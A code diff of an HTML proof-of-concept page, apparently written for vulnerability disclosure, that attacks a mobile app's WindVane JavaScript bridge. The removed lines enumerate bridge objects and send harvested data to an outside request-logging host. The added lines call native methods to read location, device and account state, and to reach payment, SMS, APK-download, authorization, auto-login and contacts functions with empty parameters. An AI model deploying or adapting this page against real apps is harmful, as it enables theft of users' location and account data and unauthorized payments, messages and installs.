@@ -1,30 +1,32 @@
 <!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>kb</title>
-<body style="background:#fff;color:#000;font:16px monospace;padding:8px">
-<pre id="o" style="white-space:pre-wrap;word-break:break-all;font-size:15px">running…</pre>
+<body style="background:#fff;color:#000;font:15px monospace;padding:8px">
+<pre id="o" style="white-space:pre-wrap;word-break:break-all;font-size:14px">running…</pre>
 <script>
-var EXFIL="https://enio2ns.requestrepo.com/requests";
-var out={href:location.href,origin:location.origin,bridges:[],calls:[],err:null};
-function methodsOf(b){var s={},a=[],o=b;for(var d=0;d<5&&o;d++){try{Object.getOwnPropertyNames(o).forEach(function(p){if(!s[p]){s[p]=1;a.push(p);}});}catch(e){}o=Object.getPrototypeOf(o);}return a;}
-function show(){var s=JSON.stringify(out,null,1);document.getElementById('o').textContent=s;try{navigator.sendBeacon&&navigator.sendBeacon(EXFIL,new Blob([s],{type:'text/plain'}));}catch(e){}}
-function callBridge(fnName,cls,meth,param){
+var out={href:location.href,hasBridge:!!window.__windvane__,res:[]};
+function show(){var s=JSON.stringify(out,null,1);document.getElementById('o').textContent=s;}
+function C(obj,meth,param,tag){
   try{
-    var wv=window.__windvane__;
-    if(wv&&wv[fnName]){
-      wv[fnName](cls,meth,param||{},
-        function(r){out.calls.push(fnName+" "+cls+"."+meth+" OK:"+JSON.stringify(r).slice(0,500));show();},
-        function(e){out.calls.push(fnName+" "+cls+"."+meth+" ERR:"+JSON.stringify(e).slice(0,400));show();});
-    } else { out.calls.push(fnName+" 不存在"); }
-  }catch(e){out.calls.push(fnName+" EXC:"+e);}
+    var w=window.__windvane__;
+    if(w&&w.call){
+      w.call(obj,meth,param||{},
+        function(r){out.res.push(tag+" ▸ "+obj+"."+meth+" OK:"+JSON.stringify(r).slice(0,700));show();},
+        function(e){out.res.push(tag+" ▸ "+obj+"."+meth+" FAIL:"+JSON.stringify(e).slice(0,400));show();});
+    }else{out.res.push("no __windvane__.call");show();}
+  }catch(e){out.res.push(tag+" ▸ "+obj+"."+meth+" EXC:"+e);show();}
 }
-try{
-  var dict=["__windvane__","WindVane","windvane","AlipayJSBridge","_DSBridge_","android","native","app","client","jsapi","prompt","sdk","container"];
-  dict.forEach(function(n){try{if(window[n])out.bridges.push({name:n,type:typeof window[n],methods:methodsOf(window[n]).slice(0,40)});}catch(e){}});
-  // 只读方法实测：证明攻击页可任意调 native
-  callBridge("call","WVNative","getDeviceInfo",{});
-  callBridge("call","BaseInfo","getBaseInfo",{});
-  callBridge("call","WVNative","getNetworkType",{});
-  callBridge("nativeCall","WVNative","getDeviceInfo",{});
-}catch(e){out.err=String(e);}
-show();setTimeout(show,3000);
+// ① 读方法取真实数据（证明影响；本机自有数据，无第三方）
+C("WVLocation","getLocation",{address:true,gps:true,network:true},"READ-定位");
+C("GG_WVLocation","getLocation",{address:true},"READ-定位2");
+C("CNHybridBaseInfoPlugin","getBaseInfo",{},"READ-设备基础信息");
+C("CNHybridCNAccount","isBindTaobao",{},"READ-账号绑定态");
+C("CNHybridCNAccount","queryAuthorizedResult",{},"READ-授权态");
+// ② 危险方法只发空参（证明可达，不触发真实支付/短信/装APK/授权）
+C("CNAlipay","tradePay",{},"REACH-支付宝下单(空参)");
+C("CNHybridCallAndSMSUtils","callAndSMS",{},"REACH-短信电话(空参)");
+C("CNHybridDownloadApk","downloadApk",{},"REACH-下载APK(空参)");
+C("CNHybridCNAccount","authorize",{},"REACH-账号授权(空参)");
+C("CNHybridAutoLogin","autoLogin",{},"REACH-自动登录(空参)");
+C("WVContacts","find",{},"REACH-通讯录查询(空参)");
+show();setTimeout(show,5000);
 </script></body>
